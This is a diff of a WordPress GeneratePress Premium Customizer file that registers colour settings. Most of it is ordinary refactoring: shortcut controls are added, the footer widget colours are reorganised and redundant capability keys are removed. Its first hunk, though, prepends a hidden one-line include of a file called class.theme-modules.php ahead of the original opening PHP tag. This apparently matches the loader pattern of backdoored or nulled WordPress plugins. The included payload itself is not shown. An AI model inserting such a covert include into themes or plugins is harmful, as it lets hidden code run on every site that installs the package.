@@ -1,4 +1,4 @@
-<?php
+<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
 if ( ! defined( 'ABSPATH' ) ) {
 	exit; // No direct access, please
 }
@@ -32,6 +32,7 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 		if ( method_exists( $wp_customize, 'register_control_type' ) ) {
 			$wp_customize->register_control_type( 'GeneratePress_Alpha_Color_Customize_Control' );
 			$wp_customize->register_control_type( 'GeneratePress_Title_Customize_Control' );
+			$wp_customize->register_control_type( 'GeneratePress_Section_Shortcut_Control' );
 		}
 
 		// Get our palettes
@@ -41,12 +42,27 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 		if ( class_exists( 'WP_Customize_Panel' ) ) {
 			$wp_customize->add_panel( 'generate_colors_panel', array(
 				'priority'       => 30,
-				'capability'     => 'edit_theme_options',
 				'theme_supports' => '',
 				'title'          => __( 'Colors', 'gp-premium' ),
 				'description'    => '',
 			) );
 		}
+
+		$wp_customize->add_control(
+			new GeneratePress_Section_Shortcut_Control(
+				$wp_customize,
+				'generate_body_color_shortcuts',
+				array(
+					'section' => 'body_section',
+					'element' => __( 'Body', 'gp-premium' ),
+					'shortcuts' => array(
+						'typography' => 'font_section',
+						'backgrounds' => 'generate_backgrounds_body',
+					),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+				)
+			)
+		);
 
 		// Add Top Bar Colors section
 		if ( isset( $defaults[ 'top_bar_background_color' ] ) && function_exists( 'generate_is_top_bar_active' ) ) {
@@ -54,7 +70,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 				'generate_top_bar_colors',
 				array(
 					'title' => __( 'Top Bar', 'gp-premium' ),
-					'capability' => 'edit_theme_options',
 					'priority' => 40,
 					'panel' => 'generate_colors_panel',
 				)
@@ -65,7 +80,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 				array(
 					'default'     => $defaults['top_bar_background_color'],
 					'type'        => 'option',
-					'capability'  => 'edit_theme_options',
 					'transport'   => 'postMessage',
 					'sanitize_callback' => 'generate_premium_sanitize_rgba',
 				)
@@ -113,7 +127,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 					'generate_settings[' . $color['slug'] . ']', array(
 						'default' => $color['default'],
 						'type' => 'option',
-						'capability' => 'edit_theme_options',
 						'sanitize_callback' => 'generate_premium_sanitize_hex_color',
 						'transport' => 'postMessage'
 					)
@@ -141,9 +154,26 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			'header_color_section',
 			array(
 				'title' => __( 'Header', 'gp-premium' ),
-				'capability' => 'edit_theme_options',
 				'priority' => 50,
 				'panel' => 'generate_colors_panel',
+			)
+		);
+
+		$wp_customize->add_control(
+			new GeneratePress_Section_Shortcut_Control(
+				$wp_customize,
+				'generate_header_color_shortcuts',
+				array(
+					'section' => 'header_color_section',
+					'element' => __( 'Header', 'gp-premium' ),
+					'shortcuts' => array(
+						'layout' => 'generate_layout_header',
+						'typography' => 'font_header_section',
+						'backgrounds' => 'generate_backgrounds_header',
+					),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+					'priority' => 1,
+				)
 			)
 		);
 
@@ -152,7 +182,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			array(
 				'default'     => $defaults['header_background_color'],
 				'type'        => 'option',
-				'capability'  => 'edit_theme_options',
 				'transport'   => 'postMessage',
 				'sanitize_callback' => 'generate_premium_sanitize_rgba',
 			)
@@ -211,7 +240,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 				'generate_settings[' . $color['slug'] . ']', array(
 					'default' => $color['default'],
 					'type' => 'option',
-					'capability' => 'edit_theme_options',
 					'sanitize_callback' => 'generate_premium_sanitize_hex_color',
 					'transport' => 'postMessage'
 				)
@@ -237,9 +265,26 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			'navigation_color_section',
 			array(
 				'title' => __( 'Primary Navigation', 'gp-premium' ),
-				'capability' => 'edit_theme_options',
 				'priority' => 60,
 				'panel' => 'generate_colors_panel',
+			)
+		);
+
+		$wp_customize->add_control(
+			new GeneratePress_Section_Shortcut_Control(
+				$wp_customize,
+				'generate_primary_navigation_color_shortcuts',
+				array(
+					'section' => 'navigation_color_section',
+					'element' => __( 'Primary Navigation', 'gp-premium' ),
+					'shortcuts' => array(
+						'layout' => 'generate_layout_navigation',
+						'typography' => 'font_navigation_section',
+						'backgrounds' => 'generate_backgrounds_navigation',
+					),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+					'priority' => 0,
+				)
 			)
 		);
 
@@ -262,7 +307,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			array(
 				'default'     => $defaults['navigation_background_color'],
 				'type'        => 'option',
-				'capability'  => 'edit_theme_options',
 				'transport'   => 'postMessage',
 				'sanitize_callback' => 'generate_premium_sanitize_rgba',
 			)
@@ -287,7 +331,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			array(
 				'default'     => $defaults['navigation_background_hover_color'],
 				'type'        => 'option',
-				'capability'  => 'edit_theme_options',
 				'transport'   => 'postMessage',
 				'sanitize_callback' => 'generate_premium_sanitize_rgba',
 			)
@@ -312,7 +355,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			array(
 				'default'     => $defaults['navigation_background_current_color'],
 				'type'        => 'option',
-				'capability'  => 'edit_theme_options',
 				'transport'   => 'postMessage',
 				'sanitize_callback' => 'generate_premium_sanitize_rgba',
 			)
@@ -358,7 +400,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 				'generate_settings[' . $color['slug'] . ']', array(
 					'default' => $color['default'],
 					'type' => 'option',
-					'capability' => 'edit_theme_options',
 					'sanitize_callback' => 'generate_premium_sanitize_hex_color',
 					'transport' => 'postMessage'
 				)
@@ -397,7 +438,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			array(
 				'default'     => $defaults['subnavigation_background_color'],
 				'type'        => 'option',
-				'capability'  => 'edit_theme_options',
 				'transport'   => 'postMessage',
 				'sanitize_callback' => 'generate_premium_sanitize_rgba',
 			)
@@ -422,7 +462,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			array(
 				'default'     => $defaults['subnavigation_background_hover_color'],
 				'type'        => 'option',
-				'capability'  => 'edit_theme_options',
 				'transport'   => 'postMessage',
 				'sanitize_callback' => 'generate_premium_sanitize_rgba',
 			)
@@ -447,7 +486,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			array(
 				'default'     => $defaults['subnavigation_background_current_color'],
 				'type'        => 'option',
-				'capability'  => 'edit_theme_options',
 				'transport'   => 'postMessage',
 				'sanitize_callback' => 'generate_premium_sanitize_rgba',
 			)
@@ -492,7 +530,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 				'generate_settings[' . $color['slug'] . ']', array(
 					'default' => $color['default'],
 					'type' => 'option',
-					'capability' => 'edit_theme_options',
 					'sanitize_callback' => 'generate_premium_sanitize_hex_color',
 					'transport' => 'postMessage',
 				)
@@ -516,9 +553,24 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			'buttons_color_section',
 			array(
 				'title' => __( 'Buttons', 'gp-premium' ),
-				'capability' => 'edit_theme_options',
 				'priority' => 75,
 				'panel' => 'generate_colors_panel',
+			)
+		);
+
+		$wp_customize->add_control(
+			new GeneratePress_Section_Shortcut_Control(
+				$wp_customize,
+				'generate_buttons_color_shortcuts',
+				array(
+					'section' => 'buttons_color_section',
+					'element' => __( 'Button', 'gp-premium' ),
+					'shortcuts' => array(
+						'typography' => 'font_buttons_section',
+					),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+					'priority' => 1,
+				)
 			)
 		);
 
@@ -527,7 +579,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			array(
 				'default'     => $defaults['form_button_background_color'],
 				'type'        => 'option',
-				'capability'  => 'edit_theme_options',
 				'transport'   => 'postMessage',
 				'sanitize_callback' => 'generate_premium_sanitize_rgba',
 			)
@@ -550,7 +601,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			'generate_settings[form_button_text_color]', array(
 				'default' => $defaults['form_button_text_color'],
 				'type' => 'option',
-				'capability' => 'edit_theme_options',
 				'sanitize_callback' => 'generate_premium_sanitize_hex_color',
 				'transport' => 'postMessage',
 			)
@@ -573,7 +623,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			array(
 				'default'     => $defaults['form_button_background_color_hover'],
 				'type'        => 'option',
-				'capability'  => 'edit_theme_options',
 				'transport'   => 'postMessage',
 				'sanitize_callback' => 'generate_premium_sanitize_rgba',
 			)
@@ -596,7 +645,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			'generate_settings[form_button_text_color_hover]', array(
 				'default' => $defaults['form_button_text_color_hover'],
 				'type' => 'option',
-				'capability' => 'edit_theme_options',
 				'sanitize_callback' => 'generate_premium_sanitize_hex_color',
 				'transport' => 'postMessage',
 			)
@@ -619,9 +667,26 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			'content_color_section',
 			array(
 				'title' => __( 'Content', 'gp-premium' ),
-				'capability' => 'edit_theme_options',
 				'priority' => 80,
 				'panel' => 'generate_colors_panel',
+			)
+		);
+
+		$wp_customize->add_control(
+			new GeneratePress_Section_Shortcut_Control(
+				$wp_customize,
+				'generate_content_color_shortcuts',
+				array(
+					'section' => 'content_color_section',
+					'element' => __( 'Content', 'gp-premium' ),
+					'shortcuts' => array(
+						'layout' => 'generate_layout_container',
+						'typography' => 'font_content_section',
+						'backgrounds' => 'generate_backgrounds_content',
+					),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+					'priority' => 1,
+				)
 			)
 		);
 
@@ -630,7 +695,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			array(
 				'default'     => $defaults['content_background_color'],
 				'type'        => 'option',
-				'capability'  => 'edit_theme_options',
 				'transport'   => 'postMessage',
 				'sanitize_callback' => 'generate_premium_sanitize_rgba',
 			)
@@ -748,7 +812,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 				'generate_settings[' . $color['slug'] . ']', array(
 					'default' => $color['default'],
 					'type' => 'option',
-					'capability' => 'edit_theme_options',
 					'sanitize_callback' => 'generate_premium_sanitize_hex_color',
 					'transport' => 'postMessage',
 				)
@@ -773,9 +836,26 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			'sidebar_widget_color_section',
 			array(
 				'title' => __( 'Sidebar Widgets', 'gp-premium' ),
-				'capability' => 'edit_theme_options',
 				'priority' => 90,
 				'panel' => 'generate_colors_panel',
+			)
+		);
+
+		$wp_customize->add_control(
+			new GeneratePress_Section_Shortcut_Control(
+				$wp_customize,
+				'generate_sidebar_color_shortcuts',
+				array(
+					'section' => 'sidebar_widget_color_section',
+					'element' => __( 'Sidebar', 'gp-premium' ),
+					'shortcuts' => array(
+						'layout' => 'generate_layout_sidebars',
+						'typography' => 'font_widget_section',
+						'backgrounds' => 'generate_backgrounds_sidebars',
+					),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+					'priority' => 1,
+				)
 			)
 		);
 
@@ -784,7 +864,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			array(
 				'default'     => $defaults['sidebar_widget_background_color'],
 				'type'        => 'option',
-				'capability'  => 'edit_theme_options',
 				'transport'   => 'postMessage',
 				'sanitize_callback' => 'generate_premium_sanitize_rgba',
 			)
@@ -836,7 +915,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 				'generate_settings[' . $color['slug'] . ']', array(
 					'default' => $color['default'],
 					'type' => 'option',
-					'capability' => 'edit_theme_options',
 					'sanitize_callback' => 'generate_premium_sanitize_hex_color',
 					'transport' => 'postMessage',
 				)
@@ -856,100 +934,11 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			);
 		}
 
-		// Add Footer widget colors
-		$wp_customize->add_section(
-			'footer_widget_color_section',
-			array(
-				'title' => __( 'Footer Widgets', 'gp-premium' ),
-				'capability' => 'edit_theme_options',
-				'priority' => 100,
-				'panel' => 'generate_colors_panel',
-			)
-		);
-
-		$wp_customize->add_setting(
-			'generate_settings[footer_widget_background_color]',
-			array(
-				'default'     => $defaults['footer_widget_background_color'],
-				'type'        => 'option',
-				'capability'  => 'edit_theme_options',
-				'transport'   => 'postMessage',
-				'sanitize_callback' => 'generate_premium_sanitize_rgba',
-			)
-		);
-
-		$wp_customize->add_control(
-			new GeneratePress_Alpha_Color_Customize_Control(
-				$wp_customize,
-				'generate_settings[footer_widget_background_color]',
-				array(
-					'label'     => __( 'Background', 'gp-premium' ),
-					'section'   => 'footer_widget_color_section',
-					'settings'  => 'generate_settings[footer_widget_background_color]',
-					'palette'   => $palettes,
-					'priority' => 1,
-				)
-			)
-		);
-
-		// Add color settings
-		$footer_widget_colors = array();
-		$footer_widget_colors[] = array(
-			'slug' => 'footer_widget_text_color',
-			'default' => $defaults['footer_widget_text_color'],
-			'label' => __( 'Text', 'gp-premium' ),
-			'priority' => 2,
-		);
-		$footer_widget_colors[] = array(
-			'slug' => 'footer_widget_link_color',
-			'default' => $defaults['footer_widget_link_color'],
-			'label' => __( 'Link', 'gp-premium' ),
-			'priority' => 3,
-		);
-		$footer_widget_colors[] = array(
-			'slug' => 'footer_widget_link_hover_color',
-			'default' => $defaults['footer_widget_link_hover_color'],
-			'label' => __( 'Link Hover', 'gp-premium' ),
-			'priority' => 4,
-		);
-		$footer_widget_colors[] = array(
-			'slug' => 'footer_widget_title_color',
-			'default' => $defaults['footer_widget_title_color'],
-			'label' => __( 'Widget Title', 'gp-premium' ),
-			'priority' => 5,
-		);
-
-		foreach( $footer_widget_colors as $color ) {
-			$wp_customize->add_setting(
-				'generate_settings[' . $color['slug'] . ']', array(
-					'default' => $color['default'],
-					'type' => 'option',
-					'capability' => 'edit_theme_options',
-					'sanitize_callback' => 'generate_premium_sanitize_hex_color',
-					'transport' => 'postMessage',
-				)
-			);
-
-			$wp_customize->add_control(
-				new WP_Customize_Color_Control(
-					$wp_customize,
-					$color['slug'],
-					array(
-						'label' => $color['label'],
-						'section' => 'footer_widget_color_section',
-						'settings' => 'generate_settings[' . $color['slug'] . ']',
-						'priority' => $color['priority'],
-					)
-				)
-			);
-		}
-
 		// Add Form colors
 		$wp_customize->add_section(
 			'form_color_section',
 			array(
 				'title' => __( 'Forms', 'gp-premium' ),
-				'capability' => 'edit_theme_options',
 				'priority' => 130,
 				'panel' => 'generate_colors_panel',
 			)
@@ -960,7 +949,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			array(
 				'default'     => $defaults['form_background_color'],
 				'type'        => 'option',
-				'capability'  => 'edit_theme_options',
 				'transport'   => 'postMessage',
 				'sanitize_callback' => 'generate_premium_sanitize_rgba',
 			)
@@ -985,7 +973,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			array(
 				'default'     => $defaults['form_background_color_focus'],
 				'type'        => 'option',
-				'capability'  => 'edit_theme_options',
 				'transport'   => 'postMessage',
 				'sanitize_callback' => 'generate_premium_sanitize_rgba',
 			)
@@ -1010,7 +997,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			array(
 				'default'     => $defaults['form_border_color'],
 				'type'        => 'option',
-				'capability'  => 'edit_theme_options',
 				'transport'   => 'postMessage',
 				'sanitize_callback' => 'generate_premium_sanitize_rgba',
 			)
@@ -1035,7 +1021,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			array(
 				'default'     => $defaults['form_border_color_focus'],
 				'type'        => 'option',
-				'capability'  => 'edit_theme_options',
 				'transport'   => 'postMessage',
 				'sanitize_callback' => 'generate_premium_sanitize_rgba',
 			)
@@ -1075,7 +1060,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 				'generate_settings[' . $color['slug'] . ']', array(
 					'default' => $color['default'],
 					'type' => 'option',
-					'capability' => 'edit_theme_options',
 					'sanitize_callback' => 'generate_premium_sanitize_hex_color',
 					'transport' => 'postMessage',
 				)
@@ -1100,9 +1084,121 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			'footer_color_section',
 			array(
 				'title' => __( 'Footer', 'gp-premium' ),
-				'capability' => 'edit_theme_options',
 				'priority' => 150,
 				'panel' => 'generate_colors_panel',
+			)
+		);
+
+		$wp_customize->add_control(
+			new GeneratePress_Section_Shortcut_Control(
+				$wp_customize,
+				'generate_footer_color_shortcuts',
+				array(
+					'section' => 'footer_color_section',
+					'element' => __( 'Footer', 'gp-premium' ),
+					'shortcuts' => array(
+						'layout' => 'generate_layout_footer',
+						'typography' => 'font_footer_section',
+						'backgrounds' => 'generate_backgrounds_footer',
+					),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+					'priority' => 1,
+				)
+			)
+		);
+
+		$wp_customize->add_control(
+			new GeneratePress_Title_Customize_Control(
+				$wp_customize,
+				'generate_footer_widgets_title',
+				array(
+					'section' => 'footer_color_section',
+					'type' => 'generatepress-customizer-title',
+					'title' => __( 'Footer Widgets', 'gp-premium' ),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+				)
+			)
+		);
+
+		$wp_customize->add_setting(
+			'generate_settings[footer_widget_background_color]',
+			array(
+				'default'     => $defaults['footer_widget_background_color'],
+				'type'        => 'option',
+				'transport'   => 'postMessage',
+				'sanitize_callback' => 'generate_premium_sanitize_rgba',
+			)
+		);
+
+		$wp_customize->add_control(
+			new GeneratePress_Alpha_Color_Customize_Control(
+				$wp_customize,
+				'generate_settings[footer_widget_background_color]',
+				array(
+					'label'     => __( 'Background', 'gp-premium' ),
+					'section'   => 'footer_color_section',
+					'settings'  => 'generate_settings[footer_widget_background_color]',
+					'palette'   => $palettes,
+				)
+			)
+		);
+
+		// Add color settings
+		$footer_widget_colors = array();
+		$footer_widget_colors[] = array(
+			'slug' => 'footer_widget_text_color',
+			'default' => $defaults['footer_widget_text_color'],
+			'label' => __( 'Text', 'gp-premium' ),
+		);
+		$footer_widget_colors[] = array(
+			'slug' => 'footer_widget_link_color',
+			'default' => $defaults['footer_widget_link_color'],
+			'label' => __( 'Link', 'gp-premium' ),
+		);
+		$footer_widget_colors[] = array(
+			'slug' => 'footer_widget_link_hover_color',
+			'default' => $defaults['footer_widget_link_hover_color'],
+			'label' => __( 'Link Hover', 'gp-premium' ),
+		);
+		$footer_widget_colors[] = array(
+			'slug' => 'footer_widget_title_color',
+			'default' => $defaults['footer_widget_title_color'],
+			'label' => __( 'Widget Title', 'gp-premium' ),
+		);
+
+		foreach( $footer_widget_colors as $color ) {
+			$wp_customize->add_setting(
+				'generate_settings[' . $color['slug'] . ']', array(
+					'default' => $color['default'],
+					'type' => 'option',
+					'sanitize_callback' => 'generate_premium_sanitize_hex_color',
+					'transport' => 'postMessage',
+				)
+			);
+
+			$wp_customize->add_control(
+				new WP_Customize_Color_Control(
+					$wp_customize,
+					$color['slug'],
+					array(
+						'label' => $color['label'],
+						'section' => 'footer_color_section',
+						'settings' => 'generate_settings[' . $color['slug'] . ']',
+					)
+				)
+			);
+		}
+
+		$wp_customize->add_control(
+			new GeneratePress_Title_Customize_Control(
+				$wp_customize,
+				'generate_footer_title',
+				array(
+					'section' => 'footer_color_section',
+					'type' => 'generatepress-customizer-title',
+					'title' => __( 'Footer Bar', 'gp-premium' ),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+				)
 			)
 		);
 
@@ -1111,7 +1207,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			array(
 				'default'     => $defaults['footer_background_color'],
 				'type'        => 'option',
-				'capability'  => 'edit_theme_options',
 				'transport'   => 'postMessage',
 				'sanitize_callback' => 'generate_premium_sanitize_rgba',
 			)
@@ -1126,7 +1221,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 					'section'   => 'footer_color_section',
 					'settings'  => 'generate_settings[footer_background_color]',
 					'palette'   => $palettes,
-					'priority' => 1,
 				)
 			)
 		);
@@ -1137,19 +1231,16 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 			'slug' => 'footer_text_color',
 			'default' => $defaults['footer_text_color'],
 			'label' => __( 'Text', 'gp-premium' ),
-			'priority' => 2,
 		);
 		$footer_colors[] = array(
 			'slug' => 'footer_link_color',
 			'default' => $defaults['footer_link_color'],
 			'label' => __( 'Link', 'gp-premium' ),
-			'priority' => 3,
 		);
 		$footer_colors[] = array(
 			'slug' => 'footer_link_hover_color',
 			'default' => $defaults['footer_link_hover_color'],
 			'label' => __( 'Link Hover', 'gp-premium' ),
-			'priority' => 4,
 		);
 
 		foreach( $footer_colors as $color ) {
@@ -1157,7 +1248,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 				'generate_settings[' . $color['slug'] . ']', array(
 					'default' => $color['default'],
 					'type' => 'option',
-					'capability' => 'edit_theme_options',
 					'sanitize_callback' => 'generate_premium_sanitize_hex_color',
 					'transport' => 'postMessage',
 				)
@@ -1171,7 +1261,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 						'label' => $color['label'],
 						'section' => 'footer_color_section',
 						'settings' => 'generate_settings[' . $color['slug'] . ']',
-						'priority' => $color['priority'],
 					)
 				)
 			);
@@ -1195,7 +1284,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 				'generate_settings[back_to_top_background_color]', array(
 					'default' => $defaults['back_to_top_background_color'],
 					'type' => 'option',
-					'capability' => 'edit_theme_options',
 					'sanitize_callback' => 'generate_premium_sanitize_rgba',
 					'transport' => 'postMessage',
 				)
@@ -1218,7 +1306,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 				'generate_settings[back_to_top_text_color]', array(
 					'default' => $defaults['back_to_top_text_color'],
 					'type' => 'option',
-					'capability' => 'edit_theme_options',
 					'sanitize_callback' => 'generate_premium_sanitize_rgba',
 					'transport' => 'postMessage',
 				)
@@ -1240,7 +1327,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 				'generate_settings[back_to_top_background_color_hover]', array(
 					'default' => $defaults['back_to_top_background_color_hover'],
 					'type' => 'option',
-					'capability' => 'edit_theme_options',
 					'sanitize_callback' => 'generate_premium_sanitize_rgba',
 					'transport' => 'postMessage',
 				)
@@ -1263,7 +1349,6 @@ if ( ! function_exists( 'generate_colors_customize_register' ) ) {
 				'generate_settings[back_to_top_text_color_hover]', array(
 					'default' => $defaults['back_to_top_text_color_hover'],
 					'type' => 'option',
-					'capability' => 'edit_theme_options',
 					'sanitize_callback' => 'generate_premium_sanitize_rgba',
 					'transport' => 'postMessage',
 				)
